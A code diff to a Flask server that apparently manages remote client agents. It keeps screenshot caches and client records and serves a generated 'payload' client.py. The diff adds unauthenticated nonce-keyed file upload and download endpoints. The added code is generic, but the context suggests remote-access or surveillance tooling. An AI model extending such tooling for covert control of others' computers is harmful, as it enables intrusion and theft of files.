@@ -27,6 +27,7 @@ DB_PATH = 'clients.db'
 screenshot_cache = {}
 last_seen_cache = {}
 connected_clients = {}
+uploaded_files = {}
 
 # --- Database Setup ---
 def init_db():
@@ -162,6 +163,34 @@ def payload():
     content = re.sub(r'(TARGET_HEIGHT\s*=\s*).*', f'TARGET_HEIGHT = {config["resolution"]}', content)
 
     return send_file(io.BytesIO(content.encode()), mimetype='text/x-python', as_attachment=True, download_name='client.py')
+
+@app.route('/api/upload/<nonce>', methods=['POST'])
+def upload_file(nonce):
+    if 'file' not in request.files:
+        return "No file part", 400
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file", 400
+    
+    uploaded_files[nonce] = {
+        'content': file.read(),
+        'filename': file.filename
+    }
+    return "Upload successful", 200
+
+@app.route('/api/download/<nonce>', methods=['GET'])
+def download_uploaded_file(nonce):
+    if nonce not in uploaded_files:
+        return "File not found", 404
+    
+    file_data = uploaded_files[nonce]
+    # Optionally remove after download to save memory
+    # data = uploaded_files.pop(nonce)
+    return send_file(
+        io.BytesIO(file_data['content']),
+        as_attachment=True,
+        download_name=file_data['filename']
+    )
 
 # --- Socket Events ---
 @socketio.on('join_dashboard', namespace="/api")
